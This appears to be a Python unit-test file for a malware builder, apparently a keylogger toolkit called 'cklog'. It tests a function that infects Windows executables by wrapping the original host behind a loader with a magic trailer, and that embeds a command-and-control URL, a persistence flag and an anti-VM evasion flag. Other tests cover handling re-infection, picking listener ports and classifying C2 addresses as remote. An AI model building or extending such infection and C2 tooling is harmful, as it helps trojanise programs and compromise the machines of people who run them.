import os
import struct
import sys
import tempfile
import unittest
from unittest import mock

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

import auto
from cklog import stage


class TestInfectionRoundTrip(unittest.TestCase):
    """End-to-end: build infected bytes, then extract the original host."""

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp(prefix="ckinf")
        # Minimal host bytes (simulates a real .exe)
        self.host_data = b"MZ" + b"\x00" * 100 + b"host payload data" + b"\x00" * 50
        self.host_path = os.path.join(self.tmpdir, "host.exe")
        with open(self.host_path, "wb") as f:
            f.write(self.host_data)

        # Need loader.exe to exist for build_infected_bytes
        loader_path = os.path.join(ROOT, "bin", "loader.exe")
        if not os.path.isfile(loader_path):
            self.skipTest("bin/loader.exe not built")

    def test_roundtrip_extracts_original_host(self):
        """Infected bytes contain [loader][host][len][CKLG]; extract host and compare."""
        infected = auto.build_infected_bytes(self.host_path, "http://127.0.0.1:9999/")
        # Find trailer
        magic = stage.MAGIC
        idx = infected.rfind(magic)
        self.assertGreater(idx, 0)
        host_len = struct.unpack_from("<I", infected, idx - 4)[0]
        self.assertEqual(host_len, len(self.host_data))
        extracted = infected[idx - 4 - host_len:idx - 4]
        self.assertEqual(extracted, self.host_data)

    def test_double_infection_extracts_original(self):
        """Infecting an already-infected host extracts the original, not the infected."""
        infected1 = auto.build_infected_bytes(self.host_path, "http://127.0.0.1:9999/")
        # Write infected to a file
        infected_path = os.path.join(self.tmpdir, "infected.exe")
        with open(infected_path, "wb") as f:
            f.write(infected1)
        # Infect again - should extract original host
        infected2 = auto.build_infected_bytes(infected_path, "http://127.0.0.1:8888/")
        magic = stage.MAGIC
        idx = infected2.rfind(magic)
        host_len = struct.unpack_from("<I", infected2, idx - 4)[0]
        extracted = infected2[idx - 4 - host_len:idx - 4]
        self.assertEqual(extracted, self.host_data)

    def test_trailer_magic_at_end(self):
        infected = auto.build_infected_bytes(self.host_path, "http://127.0.0.1:9999/")
        self.assertTrue(infected.endswith(stage.MAGIC))

    def test_loader_bytes_unchanged_structure(self):
        """The loader portion (before host) should be a valid PE."""
        from cklog import pe
        infected = auto.build_infected_bytes(self.host_path, "http://127.0.0.1:9999/")
        magic = stage.MAGIC
        idx = infected.rfind(magic)
        host_len = struct.unpack_from("<I", infected, idx - 4)[0]
        loader_size = idx - 4 - host_len
        loader_bytes = infected[:loader_size]
        self.assertTrue(pe.sections(loader_bytes))  # Valid PE

    def test_c2_url_embedded_in_loader(self):
        url = "http://127.0.0.1:9999/"
        infected = auto.build_infected_bytes(self.host_path, url)
        self.assertIn(url.encode(), infected)

    def test_persist_flag_embedded(self):
        infected = auto.build_infected_bytes(self.host_path, "http://127.0.0.1:9999/", persist=True)
        self.assertIn(stage.PERSIST_ENABLE, infected)

    def test_no_anti_vm_flag_embedded(self):
        infected = auto.build_infected_bytes(self.host_path, "http://127.0.0.1:9999/", no_anti_vm=True)
        self.assertIn(stage.AV_DISABLE, infected)


class TestFindBestPort(unittest.TestCase):
    def test_returns_preferred_if_free(self):
        import socket
        # Find a free port
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("127.0.0.1", 0))
        port = s.getsockname()[1]
        s.close()
        result = auto.find_best_port(preferred=port)
        self.assertEqual(result, port)

    def test_returns_none_when_all_occupied(self):
        # This is hard to test without occupying a huge range
        # Just verify the function doesn't crash
        result = auto.find_best_port(start=1, end=1)
        # Port 1 is likely occupied or not bindable
        self.assertTrue(result is None or isinstance(result, int))


class TestRemoteC2(unittest.TestCase):
    def test_loopback_is_not_remote(self):
        self.assertFalse(auto._remote_c2("http://127.0.0.1:9090/", False))

    def test_https_is_remote(self):
        self.assertTrue(auto._remote_c2("https://example.com:443/", False))

    def test_local_http_is_not_remote(self):
        with mock.patch.object(auto, "detect_ip", return_value="192.168.1.20"):
            self.assertFalse(auto._remote_c2("http://192.168.1.20:9090/", False))

    def test_different_host_is_remote(self):
        with mock.patch.object(auto, "detect_ip", return_value="192.168.1.20"):
            self.assertTrue(auto._remote_c2("http://10.0.0.5:9090/", False))

    def test_run_local_makes_not_remote(self):
        self.assertFalse(auto._remote_c2("http://example.com:9090/", True))


if __name__ == "__main__":
    unittest.main()
